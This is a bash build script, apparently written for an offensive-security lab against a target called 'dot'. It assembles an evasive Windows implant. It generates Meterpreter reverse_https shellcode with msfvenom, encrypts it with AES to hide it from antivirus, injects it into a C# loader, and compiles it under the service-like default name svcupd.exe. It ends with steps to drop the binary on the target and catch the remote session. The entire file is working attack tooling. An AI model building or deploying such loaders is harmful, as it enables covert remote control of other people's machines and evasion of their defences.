#!/usr/bin/env bash
# build.sh — assemble the custom .NET loader for OSAI/Shadow Supply "dot"
#
# Usage:
#   ./build.sh <LHOST> <LPORT> [payload_name] [msf_payload]
#
# Examples:
#   ./build.sh 10.10.14.5 443
#   ./build.sh 10.10.14.5 8443 svcupd.exe windows/x64/meterpreter/reverse_https
#
# Requires on Kali: msfvenom, mono-mcs (mcs), openssl, xxd, python3.

set -euo pipefail

LHOST="${1:?LHOST required}"
LPORT="${2:?LPORT required}"
OUT_NAME="${3:-svcupd.exe}"
MSF_PAYLOAD="${4:-windows/x64/meterpreter/reverse_https}"

WORKDIR="$(cd "$(dirname "$0")" && pwd)"
BUILD="$WORKDIR/build"
mkdir -p "$BUILD"

RAW_SC="$BUILD/sc.bin"
ENC_SC="$BUILD/sc.enc"
KEY_HEX="$BUILD/key.hex"
IV_HEX="$BUILD/iv.hex"
CS_FINAL="$BUILD/Loader.gen.cs"
OUT_EXE="$WORKDIR/$OUT_NAME"

echo "[*] Generating raw shellcode: $MSF_PAYLOAD  ->  $LHOST:$LPORT"
msfvenom -p "$MSF_PAYLOAD" \
    LHOST="$LHOST" LPORT="$LPORT" \
    EXITFUNC=thread \
    -f raw -o "$RAW_SC" >/dev/null

SC_LEN=$(stat -c%s "$RAW_SC")
echo "[+] Shellcode size: $SC_LEN bytes"

echo "[*] Generating fresh AES-256-CBC key + IV"
openssl rand -hex 32 > "$KEY_HEX"
openssl rand -hex 16 > "$IV_HEX"

echo "[*] Encrypting shellcode"
openssl enc -aes-256-cbc \
    -in "$RAW_SC" -out "$ENC_SC" \
    -K "$(cat "$KEY_HEX")" -iv "$(cat "$IV_HEX")"

b64() { python3 -c "import base64,sys; sys.stdout.write(base64.b64encode(open(sys.argv[1],'rb').read()).decode())" "$1"; }
hex2b64() { python3 -c "import base64,sys; sys.stdout.write(base64.b64encode(bytes.fromhex(open(sys.argv[1]).read().strip())).decode())" "$1"; }

ENC_B64=$(b64 "$ENC_SC")
KEY_B64=$(hex2b64 "$KEY_HEX")
IV_B64=$(hex2b64 "$IV_HEX")

echo "[*] Patching Loader.cs template"
cp "$WORKDIR/Loader.cs" "$CS_FINAL"
# Use a delimiter that won't appear in base64.
sed -i "s|__ENC_B64__|${ENC_B64}|" "$CS_FINAL"
sed -i "s|__KEY_B64__|${KEY_B64}|" "$CS_FINAL"
sed -i "s|__IV_B64__|${IV_B64}|"   "$CS_FINAL"

echo "[*] Compiling with mcs (x64, winexe)"
# Force TERM=xterm to work around Mono's TermInfoReader 4K limit
# (breaks on kitty/wezterm/xterm-256color with modern ncurses).
env TERM=xterm mcs /platform:x64 /target:winexe /optimize+ \
    /out:"$OUT_EXE" "$CS_FINAL"

echo
echo "[+] Built: $OUT_EXE"
echo "[+] SHA256: $(sha256sum "$OUT_EXE" | awk '{print $1}')"
echo
echo "Next steps:"
echo "  1. Start listener:   msfconsole -q -r handler.rc"
echo "  2. Drop and execute $OUT_NAME on target 'dot'"
echo "  3. Catch the session in msfconsole"
